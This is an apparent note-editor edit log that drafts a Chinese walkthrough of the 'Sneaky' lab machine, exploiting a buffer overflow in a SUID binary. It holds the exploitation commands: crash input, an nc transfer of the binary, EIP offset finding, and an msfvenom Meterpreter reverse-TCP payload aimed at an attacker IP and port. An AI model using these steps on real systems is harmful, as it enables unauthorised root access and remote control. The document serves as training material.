{"compress":true,"commitItems":[["7a764d63-96e8-4d2b-8c9b-7faaab6eb667",1578026890944,"",[[1578026833323,["whale@Whale",[[1,0,"Sneaky\n===\n\n\n"]],[0,0],[13,13]]],[1578027496718,["whale@Whale",[[1,6,"（）"]],[6,6],[8,8]]],[1578027499336,["whale@Whale",[[1,7,"suid"]],[7,7],[11,11]]],[1578027505903,["whale@Whale",[[1,11,"+缓冲区溢出提权"]],[11,11],[19,19]]],[1578027543735,["whale@Whale",[[1,26,"[https://whale3070.github.io/training/2019/10/26/07-x/](https://whale3070.github.io/training/2019/10/26/07-x/)"]],[26,26],[136,136]]],[1578027554072,["whale@Whale",[[-1,27,"https://whale3070.github.io/training/2019/10/26/07-x/"],[1,80,"# Sneaky(snmp默认口令泄露敏感信息)"]],[27,80],[51,51]]],[1578027843580,["whale@Whale",[[-1,27,"# "]],[27,27],[27,27]]],[1578029038159,["whale@Whale",[[1,26,"上一篇："]],[26,26],[30,30]]],[1578029335839,["whale@Whale",[[1,110,"\n"]],[109,109],[110,110]]],[1578029336047,["whale@Whale",[[1,111,"\n"]],[110,110],[111,111]]],[1578029336440,["whale@Whale",[[1,111,"(python -c \"print 'A'*500\")"]],[111,111],[138,138]]],[1578029372543,["whale@Whale",[[1,139,"\n"]],[138,138],[139,139]]],[1578029372776,["whale@Whale",[[1,140,"\n"]],[139,139],[140,140]]],[1578029373267,["whale@Whale",[[1,140,"python -c \"print 'A'*500\""]],[140,140],[165,165]]],[1578029378117,["whale@Whale",[[-1,111,"(python -c \"print 'A'*500\")\n"]],[111,139],[111,111]]],[1578029383143,["whale@Whale",[[1,138,"\n"]],[137,137],[138,138]]],[1578029383343,["whale@Whale",[[1,139,"\n"]],[138,138],[139,139]]],[1578029383616,["whale@Whale",[[1,139,"(python -c \"print 'A'*500\")\n"]],[139,139],[167,167]]],[1578029399766,["whale@Whale",[[1,111,"1. ```\nfind / -perm -4000 2>/dev/null > examSUID.txt\n```"]],[111,111],[167,167]]],[1578029403552,["whale@Whale",[[1,114,"\n"]],[114,114],[115,115]]],[1578029411103,["whale@Whale",[[1,114," 找到suid的"]],[113,113],[121,121]]],[1578029411729,["whale@Whale",[[-1,120,"的"]],[121,121],[120,120]]],[1578029414869,["whale@Whale",[[1,120,"权限的程序"]],[120,120],[125,125]]],[1578029418808,["whale@Whale",[[1,181,"\n"]],[180,180],[181,181]]],[1578029419973,["whale@Whale",[[1,181,"2."]],[181,181],[183,183]]],[1578029438783,["whale@Whale",[[1,184,"\n"]],[183,183],[184,184]]],[1578029438999,["whale@Whale",[[1,185,"\n"]],[184,184],[185,185]]],[1578029439231,["whale@Whale",[[1,185,"/usr/local/bin/chal $(python -c \"print 'A'*500\") Segmentation fault (core dumped)"]],[185,185],[266,266]]],[1578029440744,["whale@Whale",[[1,267,"\n"]],[266,266],[267,267]]],[1578029441087,["whale@Whale",[[1,268,"\n"]],[267,267],[268,268]]],[1578029501973,[null,[[-1,114," "],[1,120,"d"],[-1,125,"的"],[1,126," "]],[114,114],[127,127]]],[1578029501974,[null,[[1,114," "],[-1,119,"d"],[1,125,"的"],[-1,125," "]],[127,127],[114,114]]],[1578029446396,["whale@Whale",[[-1,269,"python -c \"print 'A'*500\"\n"]],[269,295],[269,269]]],[1578029448454,["whale@Whale",[[1,184,"python -c \"print 'A'*500\"\n"]],[184,184],[210,210]]],[1578029451904,["whale@Whale",[[1,183,"让"]],[183,183],[184,184]]],[1578029453062,["whale@Whale",[[-1,182,".让"]],[184,184],[182,182]]],[1578029453889,["whale@Whale",[[1,182,"。"]],[182,182],[183,183]]],[1578029454400,["whale@Whale",[[-1,182,"。"]],[183,183],[182,182]]],[1578029455627,["whale@Whale",[[1,182,". gai"]],[182,182],[187,187]]],[1578029456373,["whale@Whale",[[-1,184,"gai"]],[187,187],[184,184]]],[1578029457001,["whale@Whale",[[1,184,"rang"]],[184,184],[188,188]]],[1578029457855,["whale@Whale",[[-1,184,"rang"]],[188,188],[184,184]]],[1578029467751,["whale@Whale",[[1,184,"让该程序报错，证明可能有suid"]],[184,184],[200,200]]],[1578029473198,["whale@Whale",[[-1,196,"suid"]],[200,200],[196,196]]],[1578029479923,["whale@Whale",[[1,196,"bof漏洞"]],[196,196],[201,201]]],[1578029490294,["whale@Whale",[[1,278,"\n"]],[278,278],[279,279]]],[1578029494218,["whale@Whale",[[1,202,"·"]],[202,202],[203,203]]],[1578029495512,["whale@Whale",[[-1,202,"·"]],[203,203],[202,202]]],[1578029496105,["whale@Whale",[[1,202,"`"]],[202,202],[203,203]]],[1578029497158,["whale@Whale",[[1,228,"`"]],[228,228],[229,229]]],[1578029561974,[null,[[-1,114," "],[1,120,"d"],[-1,125,"的"],[1,126," "]],[114,114],[127,127]]],[1578029561975,[null,[[1,114," "],[-1,119,"d"],[1,125,"的"],[-1,125," "]],[127,127],[114,114]]],[1578029557860,["whale@Whale",[[1,231,"![1]($res/1.PNG)\n\n"]],[230,230],[248,248]]],[1578029621977,[null,[[-1,114," "],[1,120,"d"],[-1,125,"的"],[1,126," "]],[114,114],[127,127]]],[1578029621977,[null,[[1,114," "],[-1,119,"d"],[1,125,"的"],[-1,125," "]],[127,127],[114,114]]],[1578029565685,["whale@Whale",[[1,248,"```"]],[248,248],[251,251]]],[1578029566509,["whale@Whale",[[1,335,"```"]],[335,335],[338,338]]],[1578029568373,["whale@Whale",[[1,248,"\n"]],[247,247],[248,248]]],[1578030102003,[null,[[-1,114," "],[1,120,"d"],[-1,125,"的"],[1,126," "]],[114,114],[127,127]]],[1578030102003,[null,[[1,114," "],[-1,119,"d"],[1,125,"的"],[-1,125," "]],[127,127],[114,114]]],[1578030087126,["whale@Whale",[[1,110,"ca"]],[110,110],[112,112]]],[1578030087654,["whale@Whale",[[-1,110,"ca"]],[112,112],[110,110]]],[1578030090294,["whale@Whale",[[1,110,"参考资料：[https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/](https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/)"]],[110,110],[243,243]]],[1578030161961,[null,[[-1,247," "],[1,253,"d"],[-1,258,"的"],[1,259," "]],[247,247],[260,260]]],[1578030161961,[null,[[1,247," "],[-1,252,"d"],[1,258,"的"],[-1,258," "]],[260,260],[247,247]]],[1578030109260,["whale@Whale",[[-1,116,"https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/"],[1,178,"# 缓冲区溢出案例（一）"]],[116,178],[128,128]]],[1578034608999,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578034608999,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578034572498,["whale@Whale",[[-1,424,"\n"]],[424,424],[423,423]]],[1578034607816,["whale@Whale",[[1,423,"3. 定位EIPdez"]],[423,423],[434,434]]],[1578034608498,["whale@Whale",[[-1,431,"dez"]],[434,434],[431,431]]],[1578034668963,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578034668964,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578034609843,["whale@Whale",[[1,431,"地址"]],[431,431],[433,433]]],[1578046492959,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578046492959,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578046440368,["whale@Whale",[[-1,434,"(python -c \"print 'A'*500\")\n"]],[434,462],[434,434]]],[1578046451700,["whale@Whale",[[1,434,"```\nlocate pattern_create\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700\n```"]],[434,434],[535,535]]],[1578046456719,["whale@Whale",[[-1,527,"2700"],[1,531,"500"]],[527,531],[530,530]]],[1578046463744,["whale@Whale",[[1,434,"\n"]],[433,433],[434,434]]],[1578046464112,["whale@Whale",[[1,435,"\n"]],[434,434],[435,435]]],[1578046465915,["whale@Whale",[[-1,435,"\n"]],[435,435],[434,434]]],[1578046467941,["whale@Whale",[[1,434,"3.1 shen"]],[434,434],[442,442]]],[1578046468782,["whale@Whale",[[-1,438,"shen"]],[442,442],[438,438]]],[1578046481280,["whale@Whale",[[1,438,"生成500字节字符串"]],[438,438],[448,448]]],[1578046552963,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578046552963,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578046527223,["whale@Whale",[[1,546,"\n"]],[545,545],[546,546]]],[1578046527432,["whale@Whale",[[1,547,"\n"]],[546,546],[547,547]]],[1578046528285,["whale@Whale",[[1,547,"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\r\n"]],[547,547],[1049,1049]]],[1578046532297,["whale@Whale",[[-1,1047,"\r"],[1,1054,"\n"]],[1052,1052],[1053,1053]]],[1578046535498,["whale@Whale",[[-1,1053,"\n"],[1,1054,"5."]],[1053,1053],[1055,1055]]],[1578046536090,["whale@Whale",[[-1,1054,"."]],[1055,1055],[1054,1054]]],[1578046536290,["whale@Whale",[[-1,1053,"5"],[1,1054,"\n"]],[1054,1054],[1053,1053]]],[1578046545439,["whale@Whale",[[-1,1053,"\n"],[1,1054,"3.2 运行程序，输入该字符串"]],[1053,1053],[1068,1068]]],[1578052222974,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578052222974,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578052207060,["whale@Whale",[[-1,1048,"\n"]],[1048,1048],[1047,1047]]],[1578052208612,["whale@Whale",[[1,1067,"\n\n"]],[1067,1067],[1068,1068]]],[1578052209005,["whale@Whale",[[1,1069,"\n"]],[1068,1068],[1069,1069]]],[1578054594968,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578054594968,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578054592854,["whale@Whale",[[1,426,"\n"]],[426,426],[427,427]]],[1578054593454,["whale@Whale",[[1,427,"\n"]],[427,427],[428,428]]],[1578054654942,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578054654943,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578054597196,["whale@Whale",[[1,426," 3 "]],[425,425],[428,428]]],[1578054597736,["whale@Whale",[[-1,426,"3 "]],[428,428],[426,426]]],[1578054624092,["whale@Whale",[[1,426,"nc下载程序到本地进行分析"]],[426,426],[439,439]]],[1578054651552,["whale@Whale",[[1,441,"nc 10.10.14.8 8000 < /usr/local/bin/chal"]],[441,441],[481,481]]],[1578054775986,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578054775986,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578054764012,["whale@Whale",[[1,441,"\n"]],[440,440],[441,441]]],[1578054766779,["whale@Whale",[[1,441,"【】"]],[441,441],[443,443]]],[1578054770527,["whale@Whale",[[1,442,"kali运行"]],[442,442],[448,448]]],[1578054772020,["whale@Whale",[[1,449," "]],[449,449],[450,450]]],[1578054772935,["whale@Whale",[[-1,449," "]],[450,450],[449,449]]],[1578054775156,["whale@Whale",[[1,449,"nc -"]],[449,449],[453,453]]],[1578054835969,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578054835969,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578054783457,["whale@Whale",[[1,453,"lnvp 8000 > 1.elf"]],[453,453],[470,470]]],[1578054794371,["whale@Whale",[[1,471,"【】"]],[471,471],[473,473]]],[1578054796581,["whale@Whale",[[1,472,"mu"]],[472,472],[474,474]]],[1578054797236,["whale@Whale",[[-1,472,"mu"]],[474,474],[472,472]]],[1578054802422,["whale@Whale",[[1,472,"目标shell运行"]],[472,472],[481,481]]],[1578054807052,["whale@Whale",[[1,523,"\n"]],[522,522],[523,523]]],[1578054814539,["whale@Whale",[[1,524,"4. "]],[524,524],[527,527]]],[1578054816677,["whale@Whale",[[-1,535,"3"]],[536,536],[535,535]]],[1578054817627,["whale@Whale",[[1,535,"4"]],[535,535],[536,536]]],[1578054825126,["whale@Whale",[[1,449,"·"]],[449,449],[450,450]]],[1578054826603,["whale@Whale",[[-1,449,"·"]],[450,450],[449,449]]],[1578054827077,["whale@Whale",[[1,449,"`"]],[449,449],[450,450]]],[1578054828217,["whale@Whale",[[1,471,"`"]],[471,471],[472,472]]],[1578054829859,["whale@Whale",[[1,484,"`"]],[484,484],[485,485]]],[1578054830869,["whale@Whale",[[1,525,"`"]],[525,525],[526,526]]],[1578054895956,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578054895957,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578054854867,["whale@Whale",[[-1,466,"1.elf"],[1,471,"chal"]],[466,471],[470,470]]],[1578054861237,["whale@Whale",[[-1,1156,"3"]],[1156,1156],[1156,1156]]],[1578054861721,["whale@Whale",[[1,1156,"4"]],[1156,1156],[1157,1157]]],[1578054865074,["whale@Whale",[[-1,1173,"\n"],[1,1174,"./"]],[1173,1173],[1175,1175]]],[1578054866497,["whale@Whale",[[-1,1173,"./"]],[1175,1175],[1173,1173]]],[1578054867346,["whale@Whale",[[1,1173,"\n\n"]],[1173,1173],[1174,1174]]],[1578054871704,["whale@Whale",[[-1,1174,"\n"],[1,1175,"chmod +x chal"]],[1174,1174],[1187,1187]]],[1578054872074,["whale@Whale",[[1,1187,"\n\n"]],[1187,1187],[1188,1188]]],[1578054872563,["whale@Whale",[[-1,1188,"\n"],[1,1189,",."]],[1188,1188],[1190,1190]]],[1578054872993,["whale@Whale",[[-1,1189,"."]],[1190,1190],[1189,1189]]],[1578054873203,["whale@Whale",[[-1,1188,","],[1,1189,"\n"]],[1189,1189],[1188,1188]]],[1578054885025,["whale@Whale",[[-1,1188,"\n"],[1,1189,"./chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"]],[1188,1188],[1695,1695]]],[1578055137977,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578055137977,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578055083059,["whale@Whale",[[-1,1188,"./chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"],[1,1695,"\n"]],[1188,1695],[1188,1188]]],[1578055088954,["whale@Whale",[[-1,1160,"运行程序，输入该字符串"]],[1164,1171],[1160,1160]]],[1578055093158,["whale@Whale",[[1,1160,"gdb调试该程序"]],[1160,1160],[1168,1168]]],[1578055093832,["whale@Whale",[[1,1171,"\n"]],[1168,1168],[1169,1169]]],[1578055094136,["whale@Whale",[[1,1172,"\n"]],[1169,1169],[1170,1170]]],[1578055102268,["whale@Whale",[[1,1170,"gdb -q chal"]],[1170,1170],[1181,1181]]],[1578055102935,["whale@Whale",[[1,1184,"\n"]],[1181,1181],[1182,1182]]],[1578055105306,["whale@Whale",[[-1,1185,"chmod +x chal\n\n"]],[1184,1199],[1184,1184]]],[1578055105897,["whale@Whale",[[-1,1184,"\n"]],[1184,1184],[1183,1183]]],[1578055106313,["whale@Whale",[[-1,1183,"\n"]],[1183,1183],[1182,1182]]],[1578055134756,["whale@Whale",[[1,1183,"![2]($res/2.PNG)\n\n"]],[1182,1182],[1200,1200]]],[1578055197965,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578055197965,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578055147308,["whale@Whale",[[1,1182,"run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"]],[1182,1182],[1686,1686]]],[1578055151743,["whale@Whale",[[1,1170,"\n"]],[1169,1169],[1170,1170]]],[1578055152359,["whale@Whale",[[1,1170,"```"]],[1170,1170],[1173,1173]]],[1578055154711,["whale@Whale",[[1,1691,"\n"]],[1690,1690],[1691,1691]]],[1578055155079,["whale@Whale",[[1,1691,"```"]],[1691,1691],[1694,1694]]],[1578055159167,["whale@Whale",[[1,1713,"\n"]],[1712,1712],[1713,1713]]],[1578055159557,["whale@Whale",[[-1,1713,"\n"],[1,1714,"d"]],[1713,1713],[1714,1714]]],[1578055160076,["whale@Whale",[[-1,1713,"d"]],[1714,1714],[1713,1713]]],[1578055161008,["whale@Whale",[[1,1713,"\n\n"]],[1713,1713],[1714,1714]]],[1578055171783,["whale@Whale",[[-1,1714,"\n"],[1,1715,"得到一个地址0x316d4130"]],[1714,1714],[1730,1730]]],[1578055173224,["whale@Whale",[[1,1730,"\n\n"]],[1730,1730],[1731,1731]]],[1578055173600,["whale@Whale",[[1,1732,"\n"]],[1731,1731],[1732,1732]]],[1578055175525,["whale@Whale",[[-1,1732,"\n"],[1,1733,"5. "]],[1732,1732],[1735,1735]]],[1578055176680,["whale@Whale",[[-1,1734," "]],[1735,1735],[1734,1734]]],[1578055177358,["whale@Whale",[[1,1734," "]],[1734,1734],[1735,1735]]],[1578055258968,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578055258968,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578055209251,["whale@Whale",[[1,1735,"```\nlocate pattern_offset.rb\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438\n```"]],[1735,1735],[1851,1851]]],[1578055212503,["whale@Whale",[[1,1735,"\n"]],[1735,1735],[1736,1736]]],[1578055212847,["whale@Whale",[[1,1736,"\n"]],[1736,1736],[1737,1737]]],[1578055219780,["whale@Whale",[[1,1735,"定位Eip"]],[1735,1735],[1740,1740]]],[1578055220407,["whale@Whale",[[-1,1738,"ip"]],[1740,1740],[1738,1738]]],[1578055222112,["whale@Whale",[[1,1738,"IP地址"]],[1738,1738],[1742,1742]]],[1578055226810,["whale@Whale",[[-1,1840,"2700"],[1,1844,"500"]],[1840,1844],[1843,1843]]],[1578055233247,["whale@Whale",[[-1,1848,"9694438"],[1,1855,"16d4130"]],[1847,1855],[1855,1855]]],[1578055249862,["whale@Whale",[[1,1859,"\n\n"]],[1859,1859],[1860,1860]]],[1578055318970,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578055318971,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578055274494,["whale@Whale",[[1,1861,"![3]($res/3.PNG)\n\n"]],[1860,1860],[1878,1878]]],[1578055302566,["whale@Whale",[[-1,1860,"\n"]],[1860,1860],[1859,1859]]],[1578055378968,[null,[[-1,197," "],[1,203,"d"],[-1,208,"的"],[1,209," "]],[197,197],[210,210]]],[1578055378969,[null,[[1,197," "],[-1,202,"d"],[1,208,"的"],[-1,208," "]],[210,210],[197,197]]],[1578055325478,["whale@Whale",[[-1,116,"# "]],[118,118],[116,116]]],[1578055341988,["whale@Whale",[[1,1876,"\n"]],[1875,1875],[1876,1876]]],[1578055342606,["whale@Whale",[[1,1876,"offset 362"]],[1876,1876],[1886,1886]]],[1578055438961,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "]],[195,195],[208,208]]],[1578055438962,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "]],[208,208],[195,195]]],[1578055418363,["whale@Whale",[[1,1886,"."]],[1886,1886],[1887,1887]]],[1578055418995,["whale@Whale",[[-1,1886,"."]],[1887,1887],[1886,1886]]],[1578055420201,["whale@Whale",[[1,1886,".x"]],[1886,1886],[1888,1888]]],[1578055420767,["whale@Whale",[[-1,1886,".x"]],[1888,1888],[1886,1886]]],[1578055421540,["whale@Whale",[[1,1886,"。"]],[1886,1886],[1887,1887]]],[1578055422106,["whale@Whale",[[-1,1886,"。"]],[1887,1887],[1886,1886]]],[1578055430852,["whale@Whale",[[1,1886,"， 现在我们知道了第362jiu"]],[1886,1886],[1902,1902]]],[1578055431621,["whale@Whale",[[-1,1899,"jiu"]],[1902,1902],[1899,1899]]],[1578055438131,["whale@Whale",[[1,1899,"就是要覆盖的返回"]],[1899,1899],[1907,1907]]],[1578055499962,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "]],[195,195],[208,208]]],[1578055499962,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "]],[208,208],[195,195]]],[1578055439230,["whale@Whale",[[1,1907,"地址。"]],[1907,1907],[1910,1910]]],[1578117033971,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "]],[195,195],[208,208]]],[1578117033971,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "]],[208,208],[195,195]]],[1578117030498,["whale@Whale",[[1,1911,"\n"]],[1910,1910],[1911,1911]]],[1578117030658,["whale@Whale",[[1,1912,"\n"]],[1911,1911],[1912,1912]]],[1578117032419,["whale@Whale",[[-1,1912,"\n"],[1,1913,"6. "]],[1912,1912],[1915,1915]]],[1578117093970,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "]],[195,195],[208,208]]],[1578117093970,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "]],[208,208],[195,195]]],[1578117041209,["whale@Whale",[[1,1915,"生成shellcode"]],[1915,1915],[1926,1926]]],[1578117041984,["whale@Whale",[[1,1926,"\n\nmsfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf"]],[1926,1926],[2018,2018]]],[1578117153981,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,1927,"\n"],[1,2019,"\n"]],[195,195],[2020,2020]]],[1578117153981,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,1927,"\n"],[-1,2018,"\n"]],[2020,2020],[195,195]]],[1578117107880,["whale@Whale",[[1,1927,"\n"]],[1926,1926],[1927,1927]]],[1578117108475,["whale@Whale",[[1,1927,"ca"]],[1927,1927],[1929,1929]]],[1578117109060,["whale@Whale",[[-1,1927,"ca"]],[1929,1929],[1927,1927]]],[1578117113280,["whale@Whale",[[1,1927,"参考资料：[https://whale3070.github.io/tools/2019/03/01/x/](https://whale3070.github.io/tools/2019/03/01/x/)"]],[1927,1927],[2030,2030]]],[1578117114104,["whale@Whale",[[1,2031,"\n"]],[2030,2030],[2031,2031]]],[1578117129733,["whale@Whale",[[-1,192,"1. "],[1,195,"## "]],[192,195],[195,195]]],[1578117135475,["whale@Whale",[[-1,262,"2."],[1,264,"##"]],[262,265],[265,265]]],[1578117139191,["whale@Whale",[[-1,421,"3."],[1,423,"## "]],[421,423],[424,424]]],[1578117142264,["whale@Whale",[[-1,526,"4."],[1,528,"##"]],[526,529],[529,529]]],[1578117144730,["whale@Whale",[[-1,537,"4.1"]],[537,540],[537,537]]],[1578117147257,["whale@Whale",[[-1,1152,"4.2 "]],[1152,1156],[1152,1152]]],[1578117151288,["whale@Whale",[[1,537,"\n"]],[537,537],[538,538]]],[1578117153010,["whale@Whale",[[1,538,"**"]],[538,538],[540,540]]],[1578117213964,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2029,"\n"],[1,2121,"\n"]],[195,195],[2122,2122]]],[1578117213964,[null,[[1,195," "],[-1,200,"d"],[1,206,"的"],[-1,206," "],[1,2029,"\n"],[-1,2120,"\n"]],[2122,2122],[195,195]]],[1578117154638,["whale@Whale",[[1,551,"**"]],[551,551],[553,553]]],[1578117156464,["whale@Whale",[[1,1157,"**"]],[1157,1157],[1159,1159]]],[1578117157720,["whale@Whale",[[1,1167,"**"]],[1167,1167],[1169,1169]]],[1578117162075,["whale@Whale",[[-1,1733,"5."],[1,1735,"##"]],[1169,1169],[1736,1736]]],[1578117165687,["whale@Whale",[[-1,1915,"6."],[1,1917,"##"]],[1915,1918],[1918,1918]]],[1578117178470,["whale@Whale",[[-1,2108,"elf -o payload.elf"],[1,2126,"c"]],[2108,2126],[2108,2109]]],[1578117197074,["whale@Whale",[[-1,2087,"攻击机IP"],[1,2092,"192.168.1.104"]],[2087,2092],[2100,2100]]],[1578117201664,["whale@Whale",[[-1,2107,"攻击机端口"],[1,2112,"443"]],[2107,2112],[2110,2110]]],[1578117334957,[null,[[-1,195," "],[1,201,"d"],[-1,206,"的"],[1,207," "],[-1,2035,"\n"],[1,2087,"="],[-1,2100,"P"],[1,2107,"="],[-1,2110,"口"],[-1,2114,"cf"],[1,2116," 